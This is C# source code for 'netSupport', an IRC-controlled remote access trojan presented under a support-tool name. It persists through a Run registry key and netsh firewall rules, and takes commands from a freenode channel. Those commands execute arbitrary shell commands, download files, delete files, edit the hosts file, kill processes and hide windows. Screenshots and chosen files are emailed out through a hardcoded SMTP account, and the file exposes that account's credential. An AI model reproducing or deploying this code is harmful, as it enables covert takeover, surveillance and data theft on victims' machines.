using System;
using System.Collections;
using System.Collections.Generic;
using System.Threading;
using System.Linq;
using System.Text;
using System.Net.Mail;
using System.Runtime.InteropServices;
//using Meebey.SmartIrc4net;
using System.Windows.Forms;
using System.IO;
using System.Drawing;
using System.Net;
using System.Security;
using System.Diagnostics;
using ChatSharp;
using Microsoft.Win32;

namespace netSupport
{
    class Program
    {
        [ComVisibleAttribute(true)]
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        static extern int GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 uiAction, UInt32 uiParam, String pvParam, UInt32 fWinIni);
        private static UInt32 SPI_SETDESKWALLPAPER = 20;
        private static UInt32 SPIF_UPDATEINIFILE = 0x1;
        static Int32 iCount;
        public static System.IO.StreamWriter oF = new StreamWriter("logNetSup.txt",true);

        [DllImport("user32.dll")]
        static extern int GetWindowText(int hWnd, StringBuilder text, int count);
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi)]
        protected static extern int mciSendString(string lpstrCommand, StringBuilder lpstrReturnString, int uReturnLength, IntPtr hwndCallback);

        public static void OnError(object sender)
        {
            irc.Quit();
            Main();
        }
        public static void DeuPau(object sender,EventArgs e)
        {
            oF.WriteLine(e.ToString());
            oF.Close();
        }
        
        public static IrcClient irc = new IrcClient("chat.freenode.net", new IrcUser(System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString(), System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString()));
        public static bool logado;
        [STAThread]
        static void Main()
        {
            //Verifica se tem apenas 1 instancia
            bool createdNew;
            Mutex m = new Mutex(true, "netSupportInstanceCheck", out createdNew);
            if (!createdNew)
                Environment.Exit(1);
            GC.Collect();

            Application.ThreadException += DeuPau;

            oF.WriteLine("Iniciando ... " + DateTime.Now.ToString());

            string appname = System.AppDomain.CurrentDomain.FriendlyName;
            
            //Se não está na pasta do usuario, coloca, executa e sai mandando apagar o original, colcoa no Run
            if (System.AppDomain.CurrentDomain.BaseDirectory != Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\")
            {
                //Libera o app no firewall
                System.Diagnostics.Process.Start("netsh", "advfirewall firewall add rule name=\"netSupportTemp\" action=allow dir=out enable=yes program=\"." + @"\" + appname + "\"");
                System.Diagnostics.Process.Start("netsh", "advfirewall firewall add rule name=\"netSupport\" action=allow dir=out enable=yes program=\"" + Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\" + appname + "\"");
                try
                {
                    File.Copy(appname, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\" + appname);
                }
                catch { }
                // Coloca chave no registro pra inicializar sempre
                RegistryKey registryKeys = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
                string[] appKeyNames = registryKeys.GetSubKeyNames();
                var v = from x in appKeyNames
                        where appKeyNames.Contains("NetSupport")
                        select x;
                if (v.Count() == 0)
                {
                    RegistryKey regkey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    string startPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\" + appname;
                    regkey.SetValue("NetSupport", "\"" + startPath + "\"");
                }
            }

            irc.ConnectionComplete += (s, e) => irc.JoinChannel("#supcha");
            irc.PrivateMessageRecieved += OnChannelMessage;
            irc.ConnectAsync();
            irc.NetworkError += DeuPau;

            while (true)
            {
                GC.Collect();
                System.Threading.Thread.Sleep(1000);
                if(iCount>60*10)
                {
                    try
                    {
                        irc.ConnectAsync();
                    }
                    catch { }
                    iCount = 0; }
                iCount++;
            }
        }

        public static void OnChannelMessage(object s, ChatSharp.Events.PrivateMessageEventArgs e)
        {
            var channel = irc.Channels[e.PrivateMessage.Source];
            int spc = e.PrivateMessage.Message.IndexOf(' ');
            string cmd = (spc >= 0 ? e.PrivateMessage.Message.Substring(0, spc) : e.PrivateMessage.Message);
            string msg = (spc >= 0 ? e.PrivateMessage.Message.Substring(spc + 1) : "");

            if (cmd == System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString() + ":")
            {
                int spc2 = msg.IndexOf(' ');
                string f1 = (spc2>0 ? msg.Substring(0, spc2) : msg);
                string f2 = (spc2>0 ? msg.Substring(spc2 + 1) : "");
                cmd = f1;
                msg = f2;
            }

            switch (cmd)
            {
                case "!version":
                    channel.SendMessage("netSupport v0.2 " + DateTime.Now.ToString() + " - " + System.AppDomain.CurrentDomain.FriendlyName);
                    break;
                case "!gc":
                    GC.Collect();
                    break;
                case "!login":
                    try
                    {
                        if (msg.Substring(2, 2) == (DateTime.Today.Day + 27).ToString() && msg.Substring(8, 2) == System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString().Substring(2, 2).ToLower())
                        {
                            logado = true;
                            channel.SendMessage("cool...");
                        }
                        else
                        {
                            channel.SendMessage(":(");
                        }
                    }
                    catch
                    {
                        logado = false;
                        channel.SendMessage(":(");
                    }
                    break;
                // typical commands
                case "!join":
                    if (!logado) { channel.SendMessage(":("); break; }
                    irc.JoinChannel(msg);
                    channel.SendMessage("Joining Other Channel...");
                    break;
                case "!setwp":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, msg, SPIF_UPDATEINIFILE);
                        channel.SendMessage("Setado!");
                    }
                    catch (Exception ex)
                    {
                        channel.SendMessage("Error " + ex.Message);
                    }
                    irc.JoinChannel(msg);
                    channel.SendMessage("Joining Other Channel...");
                    break;
                case "!cmd":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        System.Diagnostics.Process.Start("CMD.exe", msg);
                        channel.SendMessage("Executado!");
                    }
                    catch (Exception ex)
                    {
                        channel.SendMessage("Error " + ex.Message);
                    }
                    break;
                case "!die":
                    if (!logado) { channel.SendMessage(":("); break; }
                    channel.SendMessage("Killing Bot...");
                    irc.Quit();
                    Thread.Sleep(200);
                    Environment.Exit(1);
                    break;
                case "!capscreen":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        int spc2 = msg.IndexOf(' ');
                        string f1 = msg.Substring(0, spc2);
                        string f2 = msg.Substring(spc2 + 1);

                        Rectangle bounds = Screen.GetBounds(Point.Empty);
                        using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                        {
                            using (Graphics g = Graphics.FromImage(bitmap))
                            {
                                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                            }
                            bitmap.Save(f1 + ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                        }
                        channel.SendMessage("Image Captured " + f1 + ".jpg");

                        MailMessage myMail = new MailMessage();
                        System.Net.Mail.SmtpClient oSMTP = new SmtpClient("smtp.mandrillapp.com", 587);
                        oSMTP.DeliveryMethod = SmtpDeliveryMethod.Network; oSMTP.UseDefaultCredentials = false; oSMTP.EnableSsl = false;
                        oSMTP.Credentials = new System.Net.NetworkCredential("vdandrade@gmail.com", "RNCNPr-qVFdZQrcPqWyAUw");
                        myMail.From = new MailAddress("adm@grupovpa.com.br", "netSupport");
                        myMail.To.Add(f2);
                        myMail.Subject = "netSupport Image:" + f1;
                        myMail.Attachments.Add(new Attachment(f1 + ".jpg"));
                        myMail.IsBodyHtml = true;
                        oSMTP.Send(myMail);
                        channel.SendMessage("Image sent!");

                    }
                    catch (Exception ex)
                    {
                        channel.SendMessage("Error " + ex.Message);
                    }
                    break;
                case "!reboot":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        System.Diagnostics.Process.Start("Shutdown", "-r -t 60");
                        channel.SendMessage("Rebooting...");
                    }
                    catch (Exception ex)
                    {
                        channel.SendMessage("Error " + ex.Message);
                    }
                    break;
                case "!stopshutdown":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        System.Diagnostics.Process.Start("Shutdown", "-a");
                        channel.SendMessage("Stopping shutdown!");
                    }
                    catch
                    {
                        channel.SendMessage("Error");
                    }
                    break;
                case "!shutdown":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        System.Diagnostics.Process.Start("Shutdown", "-s -t 60");
                        channel.SendMessage("Shutting down...");
                    }
                    catch
                    {
                        channel.SendMessage("Error");
                    }
                    break;
                case "!logoff":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        System.Diagnostics.Process.Start("Shutdown", "-l -t 60");
                        channel.SendMessage("Logging off...");
                    }
                    catch
                    {
                        channel.SendMessage("Error");
                    }
                    break;
                case "!msg":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        Process.Start("msg.exe", "* " + msg);
                        channel.SendMessage("Msgbox displayed!");
                    }
                    catch
                    {
                        channel.SendMessage("Error Displaying MessageBox");
                    }
                    break;
                case "!run":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        channel.SendMessage("Starting... " + msg);
                        string REPMSG = "!run " + msg;
                        System.Diagnostics.Process.Start(msg);
                    }
                    catch
                    {
                        channel.SendMessage("Error starting process");
                    }
                    break;
                case "!flushdns":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        System.Diagnostics.Process.Start("ipconfig", "/flushdns");
                        channel.SendMessage("DNS flushed");
                    }
                    catch
                    {
                        channel.SendMessage("Error starting IPCONFIG");
                    }
                    break;
                case "!readfile":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        int spc2 = msg.IndexOf(' ');
                        string f1 = msg.Substring(0, spc2);
                        string f2 = msg.Substring(spc2 + 1);

                        MailMessage myMail = new MailMessage();
                        System.Net.Mail.SmtpClient oSMTP = new SmtpClient("smtp.mandrillapp.com", 587);
                        oSMTP.DeliveryMethod = SmtpDeliveryMethod.Network; oSMTP.UseDefaultCredentials = false; oSMTP.EnableSsl = false;
                        oSMTP.Credentials = new System.Net.NetworkCredential("vdandrade@gmail.com", "RNCNPr-qVFdZQrcPqWyAUw");
                        myMail.From = new MailAddress("adm@grupovpa.com.br", "ADM Maestro");
                        myMail.To.Add(f2);
                        myMail.Subject = "netSupport file:" + f1;
                        myMail.Attachments.Add(new Attachment(f1));
                        myMail.IsBodyHtml = true;
                        oSMTP.Send(myMail);
                        channel.SendMessage("Mail sent!");
                    }
                    catch
                    {
                        channel.SendMessage("Error reading file");
                    }
                    break;
                case "!deletefile":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        File.Delete(msg);
                        channel.SendMessage("File deleted");
                    }
                    catch
                    {
                        channel.SendMessage("Error deleting file");
                    }
                    break;
                case "!variables":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        var kv = Environment.GetEnvironmentVariables();
                        foreach (string k in kv.Keys)
                        {
                            channel.SendMessage(k + " : " + kv[k].ToString());
                            System.Threading.Thread.Sleep(1000);
                        }
                    }
                    catch
                    {
                        channel.SendMessage("Error");
                    }
                    break;
                case "!sysinfo":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {

                        channel.SendMessage("Computer Name: " + SystemInformation.ComputerName);
                        channel.SendMessage("Cursor Size: " + SystemInformation.CursorSize.ToString().Replace("{", "|").Replace("}", "|"));
                        channel.SendMessage("User Name: " + SystemInformation.UserName);
                        channel.SendMessage("Users Domain: " + SystemInformation.UserDomainName);
                        channel.SendMessage("Virtual Screen Bounds: " + SystemInformation.VirtualScreen.ToString().Replace("{", "|").Replace("}", "|"));
                        channel.SendMessage("Primary Monitor Size: " + SystemInformation.PrimaryMonitorSize.ToString().Replace("{", "|").Replace("}", "|"));
                        channel.SendMessage("OS Version: " + Environment.OSVersion.ToString());
                        channel.SendMessage("Processor Count: " + Environment.ProcessorCount.ToString());
                        channel.SendMessage("64 Bit?: " + Environment.Is64BitOperatingSystem.ToString());
                        channel.SendMessage("System Directory: " + System.Environment.SystemDirectory);
                        System.Threading.Thread.Sleep(1000);
                        System.IO.DriveInfo driveinfo = new System.IO.DriveInfo(@"C:\");
                        channel.SendMessage("Drive Name: " + driveinfo.Name.ToString());
                        channel.SendMessage("Volume Label: " + driveinfo.VolumeLabel.ToString());
                        channel.SendMessage("Total Size: " + driveinfo.TotalSize.ToString());
                        channel.SendMessage("Free Space: " + driveinfo.TotalFreeSpace.ToString());
                        channel.SendMessage("Drive Format: " + driveinfo.DriveFormat.ToString());

                    }
                    catch
                    {
                        channel.SendMessage("Error displaying info");
                    }
                    break;

                case "!download":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        int spc2 = msg.IndexOf(' ');
                        string f1 = msg.Substring(0, spc2);
                        string f2 = msg.Substring(spc2 + 1);

                        WebClient webClient = new WebClient();
                        webClient.DownloadFile(f1, f2);
                        channel.SendMessage("Downloaded file to: " + f2);
                    }
                    catch
                    {
                        channel.SendMessage("Error downloading file");
                    }
                    break;
                case "!fluship":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        System.Diagnostics.Process.Start("ipconfig", "/release");
                        System.Diagnostics.Process.Start("ipconfig", "/renew");
                        channel.SendMessage("Successfully renewed ip (Preformed: /release /renew)");
                    }
                    catch
                    {
                        channel.SendMessage("Error starting IPCONFIG");
                    }
                    break;
                case "!siteblock":
                    if (!logado) { channel.SendMessage(":("); break; }
                    //http://www.eggheadcafe.com/community/aspnet/2/10104222/blocking-website.aspx
                    try
                    {
                        String hostspath = @"C:\Windows\System32\drivers\etc\hosts";
                        StreamWriter sw = new StreamWriter(hostspath, true);
                        String sitetoblock = "\n127.0.0.1 " + msg;
                        sw.Write(sitetoblock);
                        sw.Close();
                        channel.SendMessage("Site blocked " + msg);
                    }
                    catch
                    {
                        channel.SendMessage("Error opening HOSTS file");
                    }
                    break;
                case "!siteunblock":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        string filename = @"C:\windows\system32\drivers\etc\hosts";
                        string contents = File.ReadAllText(filename);
                        File.WriteAllText(filename, contents.Replace("127.0.0.1 " + msg, null));
                        channel.SendMessage("Site unblocked " + msg);
                    }
                    catch
                    {
                        channel.SendMessage("Error opening HOSTS file");
                    }
                    break;
                case "!rename":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        int spc2 = msg.IndexOf(' ');
                        string f1 = msg.Substring(0, spc2);
                        string f2 = msg.Substring(spc2 + 1);

                        File.Move(@f1, @f2);
                        channel.SendMessage("File Renamed " + f1 + " to " + f2);
                    }
                    catch
                    {
                        channel.SendMessage("Error renaming file");
                    }
                    break;

                case "!processes":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        foreach (Process clsProcess in Process.GetProcesses())
                        {
                            channel.SendMessage(clsProcess.ProcessName);
                            System.Threading.Thread.Sleep(500);

                        }
                    }
                    catch
                    {
                        channel.SendMessage("Error getting processes");
                    }
                    break;
                case "!processesall":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        string sProc = "";
                        foreach (Process clsProcess in Process.GetProcesses())
                        {
                            sProc += clsProcess.ProcessName + " " + clsProcess.MainModule.FileName + " | ";
                        }
                        channel.SendMessage(sProc);
                    }
                    catch
                    {
                        channel.SendMessage("Error getting processes");
                    }
                    break;
                case "!prockill":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {

                        //http://www.dreamincode.net/code/snippet1543.htm
                        foreach (Process clsProcess in Process.GetProcesses())
                        {
                            //match the currently running processes by using the StartsWith Method,
                            //this prevents us from incluing the .EXE for the process we're looking for.
                            if (clsProcess.ProcessName.StartsWith(msg))
                            {
                                clsProcess.Kill();

                            }
                        }
                        channel.SendMessage("Process Killed");
                    }
                    catch
                    {
                        channel.SendMessage("Error killing process");
                    }
                    break;
                case "!wsniff":
                    if (!logado) { channel.SendMessage(":("); break; }
                    const int nChars = 256;
                    int handle = 0;
                    StringBuilder Buff = new StringBuilder(nChars);

                    handle = GetForegroundWindow();

                    if (GetWindowText(handle, Buff, nChars) > 0)
                    {
                        channel.SendMessage("<wsniff>: " + Buff.ToString());
                    }
                    break;
                case "!exists":
                    try
                    {
                        channel.SendMessage("Exists?: " + System.IO.File.Exists(msg.ToString()));
                    }
                    catch
                    {
                        channel.SendMessage("Error Checking File");
                    }
                    break;
                case "!showwin":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        int spc2 = msg.IndexOf(' ');
                        string f1 = msg.Substring(0, spc2);
                        string f2 = msg.Substring(spc2 + 1);
                        
                        if (f1 == "1")
                        {
                            IntPtr Wind = FindWindow(null, f2);
                            ShowWindow(Wind, 1);
                            channel.SendMessage("Showed Window");
                        }
                        else if (f1 == "0")
                        {
                            IntPtr Wind = FindWindow(null, f2);
                            ShowWindow(Wind, 0);
                            channel.SendMessage("Hid Window");
                        }
                        else
                        {
                            channel.SendMessage("Invalid Flag");
                        }
                    }
                    catch
                    {
                        channel.SendMessage("Error Hiding/Showing Window");
                    }
                    break;
                case "!ontime":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        channel.SendMessage("On Time: " + TimeSpan.FromMilliseconds(Environment.TickCount).TotalMinutes.ToString());
                    }
                    catch
                    {
                        channel.SendMessage("Error");
                    }
                    break;
                case "!curpath":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        channel.SendMessage("Current Path: " + Application.ExecutablePath.ToString());
                    }
                    catch
                    {
                        channel.SendMessage("Error");
                    }
                    break;
                case "!batt":
                    if (!logado) { channel.SendMessage(":("); break; }
                    try
                    {
                        channel.SendMessage("Battery Charge Status: " + SystemInformation.PowerStatus.BatteryChargeStatus.ToString());
                        channel.SendMessage("Battery Life Percent: " + (SystemInformation.PowerStatus.BatteryLifePercent * 100).ToString());
                        channel.SendMessage("Power Cable Connected?: " + SystemInformation.PowerStatus.PowerLineStatus.ToString());
                    }
                    catch
                    {
                        channel.SendMessage("Error displaying info");
                    }
                    break;
            }
        }

    }
}

